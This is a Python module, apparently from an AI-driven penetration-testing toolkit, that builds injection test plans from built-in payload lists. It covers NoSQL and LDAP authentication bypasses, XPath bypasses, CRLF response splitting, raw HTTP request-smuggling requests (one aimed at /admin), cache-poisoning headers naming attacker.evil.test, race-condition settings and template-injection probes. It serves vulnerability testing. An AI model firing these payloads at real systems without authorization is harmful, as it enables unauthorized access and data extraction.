#!/usr/bin/env python3
"""Advanced Injection Engine — NoSQL, LDAP, CRLF, HTTP smuggling, cache poison, race (v3.0.0).

Provides advanced injection detection payloads and strategies beyond the
standard SQLi/XSS/Command injection covered by the core vulnerability detector.

Capabilities:
  1. NoSQL injection (MongoDB $ne/$gt/$regex/$where, CouchDB, Redis)
  2. LDAP injection (&)(|)(*) filter bypass + blind
  3. CRLF injection / HTTP response splitting
  4. HTTP request smuggling (CL.TE, TE.CL, TE.TE)
  5. Web cache poisoning / cache deception
  6. Race condition / TOCTOU testing
  7. Server-Side Template Injection extended (Pebble, Thymeleaf, Blade, etc.)
  8. XPATH injection
  9. IMAP/SMTP injection

This module is deterministic: it takes a vulnerability type + target context
and returns a structured injection plan. The agent executes the plan.

Usage (CLI):
  python advanced_injection.py --type nosql --target '{"url":"...","params":["id"]}'
  python advanced_injection.py --type smuggling --target '{"url":"...","proxy":"cloudflare"}'
  python advanced_injection.py --type race --target '{"url":"...","endpoint":"/api/coupon/redeem"}'
"""

from __future__ import annotations

import argparse
import json
import os
import sys
from dataclasses import dataclass, field

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from utils import load_json, dump_json


# =============================================================================
# NoSQL Injection Payloads
# =============================================================================
NOSQL_PAYLOADS = {
    "mongodb_auth_bypass": [
        {"payload": '{"$ne": null}', "type": "ne_bypass", "signal": "auth bypass or different response"},
        {"payload": '{"$gt": ""}', "type": "gt_bypass", "signal": "response differs from baseline"},
        {"payload": '{"$regex": ".*"}', "type": "regex_all", "signal": "all records returned"},
        {"payload": '{"username": {"$ne": null}, "password": {"$ne": null}}', "type": "ne_double", "signal": "auth bypass"},
    ],
    "mongodb_blind_extract": [
        {"payload": '{"$regex": "^a"}', "type": "regex_prefix", "signal": "user enumeration by prefix"},
        {"payload": '{"$regex": "^(?=a)"}', "type": "regex_lookahead", "signal": "blind character extraction"},
        {"payload": '{"$where": "sleep(3000)"}', "type": "where_sleep", "signal": "time delta >= 2.5s"},
        {"payload": '{"$where": "this.password.length > 0"}', "type": "where_length", "signal": "password existence check"},
    ],
    "mongodb_operator_injection": [
        {"payload": '{"$gt": "", "$lt": "zzzzzzzzzz"}', "type": "range", "signal": "range-based data extraction"},
        {"payload": '{"$in": ["admin", "root"]}', "type": "in_operator", "signal": "multi-value match"},
        {"payload": '{"$nin": []}', "type": "nin_empty", "signal": "all records returned"},
        {"payload": '{"$exists": true}', "type": "exists", "signal": "field existence check"},
    ],
    "redis_injection": [
        {"payload": "INFO\r\n", "type": "redis_info", "signal": "Redis server info in response"},
        {"payload": "CONFIG GET *\r\n", "type": "redis_config", "signal": "Redis config in response"},
        {"payload": "KEYS *\r\n", "type": "redis_keys", "signal": "Redis key listing in response"},
    ],
}

# =============================================================================
# LDAP Injection Payloads
# =============================================================================
LDAP_PAYLOADS = {
    "filter_bypass": [
        {"payload": "*)(&", "type": "and_bypass", "signal": "auth bypass (AND filter broken)"},
        {"payload": "*)(|(uid=*", "type": "or_inject", "signal": "OR filter injected, all users matched"},
        {"payload": "*)(|(password=*", "type": "password_or", "signal": "password enumeration possible"},
        {"payload": "admin)(&)", "type": "admin_close", "signal": "filter closed early, admin access"},
        {"payload": "*)(uid=*))(|(uid=*", "type": "multi_filter", "signal": "multi-filter injection"},
    ],
    "blind_ldap": [
        {"payload": "*)(objectClass=*", "type": "objectclass", "signal": "all objects returned"},
        {"payload": "*)(!(objectClass=*))", "type": "negate", "signal": "response differs from baseline"},
        {"payload": "*)(|(cn=*)(sn=*))", "type": "cn_sn", "signal": "attribute enumeration"},
        {"payload": "*)(|(cn=admin)(cn=*))", "type": "cn_admin", "signal": "admin account discovery"},
        {"payload": "*)(&(objectClass=user)(description=*))", "type": "description", "signal": "user enumeration"},
    ],
    "ldap_error_based": [
        {"payload": "*)", "type": "syntax_error", "signal": "LDAP syntax error in response"},
        {"payload": "\\", "type": "escape_error", "signal": "LDAP escape error in response"},
        {"payload": "\x00", "type": "null_byte", "signal": "null byte error in response"},
    ],
}

# =============================================================================
# CRLF Injection Payloads
# =============================================================================
CRLF_PAYLOADS = [
    {
        "name": "response_splitting_cookie",
        "payload": "%0d%0aSet-Cookie:PTSKILLTEST=crlf_injected;%20Path=/",
        "signal": "Set-Cookie header in response",
        "encoding": "url",
    },
    {
        "name": "response_splitting_header",
        "payload": "%0d%0aX-PTSKILLTEST:%20injected",
        "signal": "X-PTSKILLTEST header in response",
        "encoding": "url",
    },
    {
        "name": "response_splitting_body",
        "payload": "%0d%0a%0d%0aPTSKILLTEST<body>crlf",
        "signal": "Injected body content in response",
        "encoding": "url",
    },
    {
        "name": "crlf_double_encode",
        "payload": "%250d%250aSet-Cookie:PTSKILLTEST=crlf2",
        "signal": "Set-Cookie after double decode",
        "encoding": "double_url",
    },
    {
        "name": "crlf_raw",
        "payload": "\r\nSet-Cookie:PTSKILLTEST=crlf_raw",
        "signal": "Set-Cookie from raw CRLF",
        "encoding": "raw",
    },
    {
        "name": "crlf_header_termination",
        "payload": "value%0d%0aContent-Type:%20text/html%0d%0a%0d%0aPTSKILLTEST",
        "signal": "Response content-type changed",
        "encoding": "url",
    },
    {
        "name": "crlf_location_split",
        "payload": "https://target.test%0d%0aContent-Length:%200%0d%0a%0d%0a",
        "signal": "Response body truncated",
        "encoding": "url",
    },
]

# =============================================================================
# HTTP Request Smuggling Payloads
# =============================================================================
HTTP_SMUGGLING_PAYLOADS = {
    "cl_te": [
        {
            "name": "cl_te_basic",
            "request": (
                "POST / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Length: 6\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
                "G"
            ),
            "signal": "Timeout or 400 from smuggled prefix",
        },
        {
            "name": "cl_te_smuggle",
            "request": (
                "POST / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Length: 44\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
                "GET /admin HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "\r\n"
            ),
            "signal": "Next request gets /admin response",
        },
    ],
    "te_cl": [
        {
            "name": "te_cl_basic",
            "request": (
                "POST / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Transfer-Encoding: chunked\r\n"
                "Content-Length: 4\r\n"
                "\r\n"
                "5c\r\n"
                "GPOST / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Content-Length: 15\r\n"
                "\r\n"
                "x=1\r\n"
                "0\r\n"
                "\r\n"
            ),
            "signal": "400 or queue desync",
        },
    ],
    "te_te": [
        {
            "name": "te_te_obfuscated",
            "request": (
                "POST / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Transfer-Encoding: chunked\r\n"
                "Transfer-encoding: x\r\n"
                "Content-Length: 4\r\n"
                "\r\n"
                "5c\r\n"
                "GPOST / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
            ),
            "signal": "Time differential due to smuggled request",
        },
        {
            "name": "te_te_newline",
            "request": (
                "POST / HTTP/1.1\r\n"
                "Host: {host}\r\n"
                "Transfer-Encoding: chunked\r\n"
                "Transfer-Encoding : chunked\r\n"
                "Content-Length: 4\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
            ),
            "signal": "Proxy desync due to obfuscated TE",
        },
    ],
}

# =============================================================================
# Cache Poisoning Payloads
# =============================================================================
CACHE_POISONING_PAYLOADS = [
    {
        "name": "x_forwarded_host",
        "header": "X-Forwarded-Host",
        "value": "attacker.evil.test",
        "signal": "Response contains attacker.evil.test in absolute URLs",
    },
    {
        "name": "x_forwarded_scheme",
        "header": "X-Forwarded-Scheme",
        "value": "http",
        "signal": "Response redirects to http:// instead of https://",
    },
    {
        "name": "x_forwarded_port",
        "header": "X-Forwarded-Port",
        "value": "8443",
        "signal": "Response contains non-standard port in URLs",
    },
    {
        "name": "origin_header",
        "header": "Origin",
        "value": "https://attacker.evil.test",
        "signal": "Origin reflected in response or CORS headers",
    },
    {
        "name": "unkeyed_custom_header",
        "header": "X-PTSKILLTEST-Cache",
        "value": "injected_cache_value",
        "signal": "Custom header value reflected in cached response",
    },
    {
        "name": "fat_get",
        "header": "Content-Type",
        "value": "application/x-www-form-urlencoded",
        "body": "x=PTSKILLTEST",
        "method": "GET",
        "signal": "POST request body accepted on GET and cached",
    },
    {
        "name": "cache_deception",
        "path_suffix": ".css",
        "signal": "Authenticated page cached as static resource (/profile.css)",
    },
]

# =============================================================================
# Race Condition Payloads
# =============================================================================
RACE_CONDITION_PAYLOADS = {
    "single_packet": {
        "description": "Send all requests in a single TCP packet (last-byte sync)",
        "concurrency": 10,
        "delay_ms": 0,
        "signal": "Multiple actions applied when only one should",
    },
    "http2_single_packet": {
        "description": "HTTP/2 single-packet attack (multiple streams in one TCP packet)",
        "concurrency": 20,
        "delay_ms": 0,
        "signal": "Duplicate actions via HTTP/2 multiplexing",
    },
    "turbo_intruder_style": {
        "description": "Send requests with pipelining and no delay",
        "concurrency": 5,
        "delay_ms": 1,
        "signal": "Race condition detected via concurrent requests",
    },
    "long_poll_race": {
        "description": "Send request 1, delay, send request 2 simultaneously",
        "concurrency": 2,
        "delay_ms": 50,
        "signal": "First request committed before second validated",
    },
}

# =============================================================================
# Extended SSTI Payloads (beyond the basic {{7*7}})
# =============================================================================
EXTENDED_SSTI_PAYLOADS = {
    "pebble": [
        {"payload": "{{ 'PTSKILLTEST' }}", "signal": "PTSKILLTEST reflected"},
        {"payload": "{% if 1==1 %}PTSKILLTEST{% endif %}", "signal": "PTSKILLTEST in conditional"},
    ],
    "thymeleaf": [
        {"payload": "${7*7}", "signal": "49 in response"},
        {"payload": "*{7*7}", "signal": "49 in response"},
        {"payload": "__${7*7}__::.x", "signal": "49 prepended"},
    ],
    "blade": [
        {"payload": "{{ 7*7 }}", "signal": "49 in response"},
        {"payload": "{!! 7*7 !!}", "signal": "49 in response (unescaped)"},
    ],
    "razor": [
        {"payload": "@(7*7)", "signal": "49 in response"},
        {"payload": "@{7*7}", "signal": "49 in response"},
    ],
    "smarty": [
        {"payload": "{$smarty.now}", "signal": "timestamp in response"},
        {"payload": "{7*7}", "signal": "49 in response"},
    ],
    "mako": [
        {"payload": "${7*7}", "signal": "49 in response"},
        {"payload": "${'PTSKILLTEST'}", "signal": "PTSKILLTEST in response"},
    ],
}

# =============================================================================
# XPATH Injection Payloads
# =============================================================================
XPATH_PAYLOADS = [
    {"payload": "' or '1'='1", "type": "auth_bypass", "signal": "Authentication bypass"},
    {"payload": "' or true() or '", "type": "true_function", "signal": "All records returned"},
    {"payload": "' and count(//user)>0 or '1'='1", "type": "count", "signal": "Node existence check"},
    {"payload": "' and string-length(//user[1]/password)>0 or '", "type": "string_length", "signal": "Blind data extraction"},
    {"payload": "admin' or '1'='1", "type": "admin_bypass", "signal": "Admin access bypass"},
    {"payload": "' or 1=1] | //user[1] | //x[", "type": "union", "signal": "Data union injection"},
]


@dataclass
class InjectionPlan:
    """An injection test plan for a specific vulnerability type."""
    vuln_type: str
    target: dict
    payloads: list = field(default_factory=list)
    strategy: str = ""
    notes: str = ""


def build_nosql_plan(target: dict) -> InjectionPlan:
    """Build NoSQL injection test plan."""
    params = target.get("params", [])
    plan = InjectionPlan(vuln_type="nosql", target=target,
                         strategy="operator_injection + blind_extract")

    for category, payloads in NOSQL_PAYLOADS.items():
        for p in payloads:
            for param in params:
                plan.payloads.append({
                    "param": param,
                    "category": category,
                    "payload": p["payload"],
                    "type": p["type"],
                    "signal": p["signal"],
                    "content_type": "application/json",
                })
    return plan


def build_ldap_plan(target: dict) -> InjectionPlan:
    """Build LDAP injection test plan."""
    params = target.get("params", ["user", "username", "name"])
    plan = InjectionPlan(vuln_type="ldap", target=target,
                         strategy="filter_bypass → blind → error_based")

    for category, payloads in LDAP_PAYLOADS.items():
        for p in payloads:
            for param in params:
                plan.payloads.append({
                    "param": param,
                    "category": category,
                    "payload": p["payload"],
                    "type": p["type"],
                    "signal": p["signal"],
                })
    return plan


def build_crlf_plan(target: dict) -> InjectionPlan:
    """Build CRLF injection test plan."""
    params = target.get("params", ["redirect", "url", "return", "next", "language"])
    plan = InjectionPlan(vuln_type="crlf", target=target,
                         strategy="url_encode → double_encode → raw")

    for p in CRLF_PAYLOADS:
        for param in params:
            plan.payloads.append({
                "param": param,
                "name": p["name"],
                "payload": p["payload"],
                "encoding": p["encoding"],
                "signal": p["signal"],
            })
    return plan


def build_smuggling_plan(target: dict) -> InjectionPlan:
    """Build HTTP request smuggling test plan."""
    host = target.get("host", target.get("url", "target.test"))
    plan = InjectionPlan(vuln_type="smuggling", target=target,
                         strategy="CL.TE → TE.CL → TE.TE")
    plan.notes = "HTTP request smuggling requires careful timing analysis. Use with caution."

    for technique, payloads in HTTP_SMUGGLING_PAYLOADS.items():
        for p in payloads:
            plan.payloads.append({
                "technique": technique,
                "name": p["name"],
                "request": p["request"].replace("{host}", host),
                "signal": p["signal"],
            })
    return plan


def build_cache_poisoning_plan(target: dict) -> InjectionPlan:
    """Build web cache poisoning test plan."""
    plan = InjectionPlan(vuln_type="cache_poisoning", target=target,
                         strategy="unkeyed_header → xfh → deception")

    for p in CACHE_POISONING_PAYLOADS:
        entry = {
            "name": p["name"],
            "signal": p["signal"],
        }
        if "header" in p:
            entry["header"] = p["header"]
            entry["value"] = p["value"]
        if "body" in p:
            entry["body"] = p["body"]
        if "method" in p:
            entry["method"] = p["method"]
        if "path_suffix" in p:
            entry["path_suffix"] = p["path_suffix"]
        plan.payloads.append(entry)
    return plan


def build_race_condition_plan(target: dict) -> InjectionPlan:
    """Build race condition test plan."""
    plan = InjectionPlan(vuln_type="race_condition", target=target,
                         strategy="single_packet → pipeline → long_poll")
    plan.notes = "Race condition testing requires the agent to send concurrent requests. Each test must use synthetic data only."

    for name, config in RACE_CONDITION_PAYLOADS.items():
        plan.payloads.append({
            "name": name,
            "description": config["description"],
            "concurrency": config["concurrency"],
            "delay_ms": config["delay_ms"],
            "signal": config["signal"],
        })
    return plan


def build_extended_ssti_plan(target: dict) -> InjectionPlan:
    """Build extended SSTI test plan (beyond basic template systems)."""
    params = target.get("params", ["q", "name", "template", "msg"])
    plan = InjectionPlan(vuln_type="ssti_extended", target=target,
                         strategy="specific_engine_detection")
    plan.notes = "Extended SSTI detection: test Pebble, Thymeleaf, Blade, Razor, Smarty, Mako"

    for engine, payloads in EXTENDED_SSTI_PAYLOADS.items():
        for p in payloads:
            for param in params:
                plan.payloads.append({
                    "param": param,
                    "engine": engine,
                    "payload": p["payload"],
                    "signal": p["signal"],
                })
    return plan


def build_xpath_plan(target: dict) -> InjectionPlan:
    """Build XPATH injection test plan."""
    params = target.get("params", ["user", "username", "search", "q", "query"])
    plan = InjectionPlan(vuln_type="xpath", target=target,
                         strategy="auth_bypass → blind_extract")

    for p in XPATH_PAYLOADS:
        for param in params:
            plan.payloads.append({
                "param": param,
                "payload": p["payload"],
                "type": p["type"],
                "signal": p["signal"],
            })
    return plan


def build_plan(vuln_type: str, target: dict) -> dict:
    """Build an injection test plan for the given vulnerability type and target.

    Args:
        vuln_type: nosql | ldap | crlf | smuggling | cache_poisoning |
                   race_condition | ssti_extended | xpath
        target: dict with url, params, host, etc.

    Returns:
        Injection plan dict with payloads and strategy.
    """
    builders = {
        "nosql": build_nosql_plan,
        "ldap": build_ldap_plan,
        "crlf": build_crlf_plan,
        "smuggling": build_smuggling_plan,
        "cache_poisoning": build_cache_poisoning_plan,
        "race_condition": build_race_condition_plan,
        "ssti_extended": build_extended_ssti_plan,
        "xpath": build_xpath_plan,
    }

    builder = builders.get(vuln_type)
    if not builder:
        return {"error": f"unknown vuln_type: {vuln_type}", "supported": list(builders.keys())}

    plan = builder(target)
    return {
        "vuln_type": plan.vuln_type,
        "target": plan.target,
        "strategy": plan.strategy,
        "notes": plan.notes,
        "payload_count": len(plan.payloads),
        "payloads": plan.payloads,
    }


def main() -> int:
    ap = argparse.ArgumentParser(description="Advanced Injection Engine (v3.0)")
    ap.add_argument("--type", required=True,
                    choices=["nosql", "ldap", "crlf", "smuggling", "cache_poisoning",
                             "race_condition", "ssti_extended", "xpath"],
                    help="Injection type to plan")
    ap.add_argument("--target", required=True, help="Target JSON (path or '-')")
    args = ap.parse_args()

    target = load_json(args.target)
    plan = build_plan(args.type, target)
    print(dump_json(plan))
    return 0 if "error" not in plan else 1


if __name__ == "__main__":
    sys.exit(main())